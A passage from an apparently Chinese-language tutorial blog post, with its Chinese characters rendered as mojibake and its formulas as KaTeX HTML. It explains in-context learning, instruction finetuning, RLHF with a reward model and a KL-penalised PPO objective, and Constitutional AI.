<li><strong>æœºåˆ¶</strong>ï¼šåœ¨è¾“å…¥ä¸­å‰ç½®å‡ ä¸ªç¤ºä¾‹ï¼ˆExamplesï¼‰ï¼Œä¾‹å¦‚ <code>gaot =&gt; goat</code>ï¼Œæ¨¡å‹å°±èƒ½ç†è§£â€œæ‹¼å†™çº æ­£â€çš„ä»»åŠ¡æ„å›¾ã€‚</li>
<li><strong>æœ¬è´¨</strong>ï¼šå…³é”®åœ¨äº <strong>No Gradient Updates</strong>ã€‚æ¨¡å‹å‚æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î¸</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">Î¸</span></span></span></span></span> æ²¡æœ‰æ”¹å˜ï¼Œæ¨¡å‹æ˜¯åœ¨æ¨ç†é˜¶æ®µé€šè¿‡ Attention æœºåˆ¶ï¼Œåˆ©ç”¨ä¸Šä¸‹æ–‡ä¸­çš„ç¤ºä¾‹æ¥å®šä½ä»»åŠ¡åˆ†å¸ƒã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-4">äºŒã€ è§„è®­ï¼šæŒ‡ä»¤å¾®è°ƒ (Instruction Finetuning)</h3>
<p>è™½ç„¶ GPT-3 å¾ˆå¼ºï¼Œä½†å®ƒæœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªâ€œæ–‡æœ¬è¡¥å…¨æœºâ€ï¼Œè€Œéâ€œåŠ©æ‰‹â€ã€‚ä¸ºäº†è®©æ¨¡å‹å¬æ‡‚æŒ‡ä»¤ï¼Œæˆ‘ä»¬è¿›å…¥äº† <strong>Instruction Finetuning</strong> é˜¶æ®µã€‚</p>
<ul>
<li><strong>æ–¹æ³•</strong>ï¼šå°†å¤§é‡ NLP ä»»åŠ¡ï¼ˆç¿»è¯‘ã€æ¨ç†ã€é—®ç­”ï¼‰è½¬åŒ–ä¸ºæŒ‡ä»¤æ ¼å¼ï¼Œå¯¹é¢„è®­ç»ƒæ¨¡å‹ï¼ˆå¦‚ T5ï¼‰è¿›è¡Œå…¨é‡å¾®è°ƒï¼Œå¾—åˆ° Flan-T5ã€‚</li>
<li><strong>æ•ˆæœ</strong>ï¼šå®éªŒè¡¨æ˜ï¼Œæ¨¡å‹è¶Šå¤§ï¼ŒæŒ‡ä»¤å¾®è°ƒå¸¦æ¥çš„æ€§èƒ½å¢ç›Šï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Î”</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Î”</span></span></span></span></span>ï¼‰è¶Šæ˜¾è‘—ï¼ˆScaling Lawï¼‰ã€‚</li>
</ul>
<p>å±€é™æ€§ (The Limitations)</p>
<p>ç„¶è€Œï¼Œä¼ ç»Ÿçš„ç›‘ç£å¾®è°ƒï¼ˆSFTï¼‰å­˜åœ¨ç“¶é¢ˆï¼š</p>
<ol>
<li><strong>æ•°æ®æ˜‚è´µ</strong>ï¼šæ”¶é›†é«˜è´¨é‡çš„â€œæ ‡å‡†ç­”æ¡ˆâ€æˆæœ¬æé«˜ã€‚</li>
<li><strong>ç¼ºä¹ç»†å¾®å·®åˆ«</strong>ï¼šå¯¹äºå¼€æ”¾å¼ä»»åŠ¡ï¼ˆå¦‚â€œå†™ä¸€ä¸ªå…³äºç‹—å’Œèš±èœ¢çš„æ•…äº‹â€ï¼‰ï¼Œæ²¡æœ‰å”¯ä¸€çš„æ­£ç¡®ç­”æ¡ˆã€‚</li>
<li><strong>æƒ©ç½šæœºåˆ¶åƒµåŒ–</strong>ï¼šåœ¨ Cross-Entropy Loss ä¸‹ï¼Œå°†â€œå†’é™©ç‰‡â€é¢„æµ‹ä¸ºâ€œå¥‡å¹»ç‰‡â€ï¼ˆæ¥è¿‘æ­£ç¡®ï¼‰å’Œé¢„æµ‹ä¸ºâ€œéŸ³ä¹å‰§â€ï¼ˆå®Œå…¨é”™è¯¯ï¼‰å—åˆ°çš„æƒ©ç½šæ˜¯ä¸€æ ·çš„ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-5">ä¸‰ã€ å¯¹é½ï¼šåŸºäºäººç±»åé¦ˆçš„å¼ºåŒ–å­¦ä¹  (RLHF)</h3>
<p>ä¸ºäº†è§£å†³ SFT çš„å±€é™ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§èƒ½ç†è§£â€œå¥½åä¼˜åŠ£â€è€Œéå•çº¯â€œå¯¹é”™â€çš„æœºåˆ¶ã€‚è¿™æ­£æ˜¯ <strong>RLHF (Reinforcement Learning from Human Feedback)</strong> çš„ç”¨æ­¦ä¹‹åœ°ã€‚</p>
<h4 data-id="heading-6">1. ä¸ºä»€ä¹ˆæ˜¯ RLï¼Ÿ</h4>
<p>è™½ç„¶ RL åœ¨æ¸¸æˆé¢†åŸŸï¼ˆAlphaGoï¼‰æ—©å·²å¤§æ”¾å¼‚å½©ï¼Œä½†åœ¨è¯­è¨€æ¨¡å‹ä¸Šçš„åº”ç”¨æ˜¯è¾ƒæ–°çš„çªç ´ï¼ˆPPO ç®—æ³•çš„å‡ºç°è§£å†³äº†ç¨³å®šæ€§é—®é¢˜ï¼‰ã€‚RL å…è®¸æˆ‘ä»¬è¦é’ˆå¯¹<strong>ä¸å¯å¯¼</strong>çš„å¥–åŠ±å‡½æ•°ï¼ˆäººç±»åå¥½ï¼‰è¿›è¡Œä¼˜åŒ–ã€‚</p>
<h4 data-id="heading-7">2. æ ¸å¿ƒç»„ä»¶ï¼šå¥–åŠ±æ¨¡å‹ (Reward Model)</h4>
<p>æ—¢ç„¶äººç±»æ‰“åˆ†å™ªå£°å¤ªå¤§ï¼Œæˆ‘ä»¬é‡‡ç”¨äº† <strong>Pairwise Comparisonï¼ˆæˆå¯¹æ¯”è¾ƒï¼‰</strong> ã€‚</p>
<ul>
<li>
<p>è®©æ¨¡å‹ç”Ÿæˆä¸¤ä¸ªå›ç­” <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>s</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">s^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>s</mi><mi>l</mi></msup></mrow><annotation encoding="application/x-tex">s^l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span></span></span></span></span></span></span></span>ï¼Œäººç±»åªéœ€åˆ¤æ–­ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>s</mi><mi>w</mi></msup><mo>&gt;</mo><msup><mi>s</mi><mi>l</mi></msup></mrow><annotation encoding="application/x-tex">s^w &gt; s^l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7035em;vertical-align:-0.0391em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8491em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span></span></span></span></span></span></span></span>ã€‚</p>
</li>
<li>
<p>é€šè¿‡ Bradley-Terry æ¨¡å‹ è®­ç»ƒå¥–åŠ±æ¨¡å‹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>M</mi><mi>Ï•</mi></msub></mrow><annotation encoding="application/x-tex">RM_\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Ï•</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œä½¿å…¶æ»¡è¶³ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>J</mi><mrow><mi>R</mi><mi>M</mi></mrow></msub><mo stretchy="false">(</mo><mi>Ï•</mi><mo stretchy="false">)</mo><mo>=</mo><mo>âˆ’</mo><msub><mi mathvariant="double-struck">E</mi><mrow><mo stretchy="false">(</mo><msup><mi>s</mi><mi>w</mi></msup><mo separator="true">,</mo><msup><mi>s</mi><mi>l</mi></msup><mo stretchy="false">)</mo><mo>âˆ¼</mo><mi>D</mi></mrow></msub><mo stretchy="false">[</mo><mi>log</mi><mo>â¡</mo><mi>Ïƒ</mi><mo stretchy="false">(</mo><mi>R</mi><msub><mi>M</mi><mi>Ï•</mi></msub><mo stretchy="false">(</mo><msup><mi>s</mi><mi>w</mi></msup><mo stretchy="false">)</mo><mo>âˆ’</mo><mi>R</mi><msub><mi>M</mi><mi>Ï•</mi></msub><mo stretchy="false">(</mo><msup><mi>s</mi><mi>l</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">J_{RM}(\phi) = -\mathbb{E}_{(s^w, s^l) \sim D} [\log \sigma (RM_\phi(s^w) - RM_\phi(s^l))]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0962em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">RM</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">Ï•</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1276em;vertical-align:-0.3776em;"/><span class="mord">âˆ’</span><span class="mord"><span class="mord mathbb">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.4974em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.782em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span></span></span></span><span class="mclose mtight">)</span><span class="mrel mtight">âˆ¼</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3776em;"><span/></span></span></span></span></span><span class="mopen">[</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Ï•</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.1352em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Ï•</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span></span></span></span><span class="mclose">))]</span></span></span></span></span></p>
<p>è¿™ä¸€æ­¥å°†äººç±»æ¨¡ç³Šçš„ä»·å€¼è§‚å›ºåŒ–ä¸ºäº†ä¸€ä¸ªå¯è®¡ç®—çš„ç¥ç»ç½‘ç»œã€‚</p>
</li>
</ul>
<h4 data-id="heading-8">3. ç»ˆæå¾ªç¯ï¼šPPO ä¸ KL æ•£åº¦æƒ©ç½š</h4>
<p>è¿™æ˜¯ ChatGPT è®­ç»ƒæµç¨‹çš„æœ€åä¸€å—æ‹¼å›¾ã€‚æˆ‘ä»¬éœ€è¦è®­ç»ƒä¸€ä¸ªæ–°çš„ç­–ç•¥æ¨¡å‹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mi>Î¸</mi><mrow><mi>R</mi><mi>L</mi></mrow></msubsup></mrow><annotation encoding="application/x-tex">p_\theta^{RL}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1244em;vertical-align:-0.2831em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.4169em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">Î¸</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2831em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œä¼˜åŒ–ç›®æ ‡å¦‚ä¸‹ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><msub><mi>M</mi><mi>Ï•</mi></msub><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>âˆ’</mo><mi>Î²</mi><mi>log</mi><mo>â¡</mo><mrow><mo fence="true">(</mo><mfrac><mrow><msubsup><mi>p</mi><mi>Î¸</mi><mrow><mi>R</mi><mi>L</mi></mrow></msubsup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><mrow><msup><mi>p</mi><mrow><mi>P</mi><mi>T</mi></mrow></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">R(s) = RM_\phi(s) - \beta \log \left( \frac{p_\theta^{RL}(s)}{p^{PT}(s)} \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Ï•</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.8036em;vertical-align:-0.65em;"/><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1536em;"><span style="top:-2.6481em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7741em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">PT</span></span></span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9191em;"><span style="top:-2.214em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">Î¸</span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span/></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5269em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span></span></p>
<ul>
<li>
<p><strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>M</mi><mi>Ï•</mi></msub><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">RM_\phi(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Ï•</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span></strong> ï¼šé©±ä½¿æ¨¡å‹å°½å¯èƒ½è·å¾—é«˜åˆ†ï¼ˆè®¨å¥½äººç±»ï¼‰ã€‚</p>
</li>
<li>
<p><strong>KL Penalty</strong>ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mi>Î²</mi><mi>log</mi><mo>â¡</mo><mo stretchy="false">(</mo><mo>â€¦</mo><mtext>â€‰</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">-\beta \log (\dots)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">âˆ’</span><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mclose">)</span></span></span></span></span> æ˜¯ä¸€é“ç´§ç®å’’ã€‚å®ƒå¼ºè¿«æ–°æ¨¡å‹çš„åˆ†å¸ƒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mrow><mi>R</mi><mi>L</mi></mrow></msup></mrow><annotation encoding="application/x-tex">p^{RL}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0358em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mathnormal mtight">L</span></span></span></span></span></span></span></span></span></span></span></span></span> ä¸èƒ½åç¦»åŸå§‹é¢„è®­ç»ƒæ¨¡å‹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mrow><mi>P</mi><mi>T</mi></mrow></msup></mrow><annotation encoding="application/x-tex">p^{PT}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0358em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">PT</span></span></span></span></span></span></span></span></span></span></span></span></span> å¤ªè¿œã€‚</p>
<ul>
<li><strong>å¦‚æœæ²¡æœ‰å®ƒ</strong>ï¼šæ¨¡å‹ä¼šåˆ©ç”¨ Reward Model çš„æ¼æ´è¿›è¡Œâ€œåˆ·åˆ†â€ï¼ˆReward Hackingï¼‰ï¼Œè¾“å‡ºäººç±»æ— æ³•ç†è§£çš„ä¹±ç ã€‚</li>
<li><strong>æœ‰äº†å®ƒ</strong>ï¼šæ¨¡å‹åœ¨ä¿æŒè¯­è¨€æµåˆ©åº¦ï¼ˆä¸å¿˜åˆå¿ƒï¼‰çš„å‰æä¸‹ï¼Œå°½å¯èƒ½ç¬¦åˆäººç±»åå¥½ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-9">å››ã€ æœªæ¥ï¼šConstitutional AI</h3>
<p>RLHF è™½ç„¶å¼ºå¤§ï¼Œä½†ä¾èµ–å¤§é‡äººç±»æ ‡æ³¨ï¼ˆData Expensiveï¼‰ã€‚æœªæ¥çš„æ–¹å‘æ˜¯ <strong>RLAIF (RL from AI Feedback)</strong> ï¼Œå³â€œå®ªæ³• AIâ€ã€‚</p>
<p>é€šè¿‡ç»™å®šä¸€å¥—åŸåˆ™ï¼ˆConstitutionï¼‰ï¼Œè®© AI è‡ªå·±å¯¹è‡ªå·±ç”Ÿæˆçš„å›ç­”è¿›è¡Œ <strong>Critiqueï¼ˆæ‰¹åˆ¤ï¼‰</strong> å’Œ <strong>Revisionï¼ˆä¿®æ­£ï¼‰</strong> ï¼Œä»è€Œå®ç°è‡ªæˆ‘è¿­ä»£ã€‚å¦‚æœè¯´ RLHF æ˜¯â€œä¾äººæ³•æ²»â€ï¼Œé‚£ä¹ˆ RLAIF å°±æ˜¯â€œä¾å®ªæ³•æ²»â€ã€‚</p>
<blockquote>
<p>ç»“è¯­</p>
<p>ä» GPT-2 çš„ TL;DR åˆ° GPT-4 çš„ RLHFï¼Œæœ¬è´¨ä¸Šæ˜¯æˆ‘ä»¬ä¸ä»…å¸Œæœ› AI æ‡‚å¾—å¤šï¼ˆPre-trainingï¼‰ï¼Œæ›´å¸Œæœ› AI æ‡‚æˆ‘ä»¬ï¼ˆAlignmentï¼‰ã€‚è¿™ä¸€è¿‡ç¨‹ï¼Œæ­£æ˜¯ä»â€œç»Ÿè®¡æ¦‚ç‡â€å‘â€œç±»äººæ™ºèƒ½â€è·¨è¶Šçš„å…³é”®ä¸€æ­¥ã€‚</p>
